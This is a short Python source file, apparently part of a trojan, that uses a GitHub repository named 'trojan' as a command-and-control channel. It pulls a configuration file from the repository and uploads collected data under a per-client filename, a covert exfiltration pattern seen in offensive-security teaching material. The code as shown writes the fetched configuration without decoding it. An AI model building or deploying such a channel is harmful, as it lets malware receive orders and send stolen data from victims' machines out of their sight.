import requests
from config import GITHUB_TOKEN

class GithubIntegration:
    def __init__(self, client_id):
        self.client_id = client_id
        self.repo_url = "https://api.github.com/repos/GerbenVandeVelde/trojan"
        self.headers = {
            "Authorization": f"token {GITHUB_TOKEN}"
        }

    def pull_config(self):
        config_url = f"{self.repo_url}/contents/config/config.json"
        response = requests.get(config_url, headers=self.headers)
        if response.status_code == 200:
            config_content = response.json()['content']
            with open('config.json', 'w') as f:
                f.write(config_content)

    def push_data(self, data, filename):
        data_url = f"{self.repo_url}/contents/data/{self.client_id}_{filename}"
        response = requests.put(data_url, headers=self.headers, json={"message": "update data", "content": data})
        return response.status_code == 201
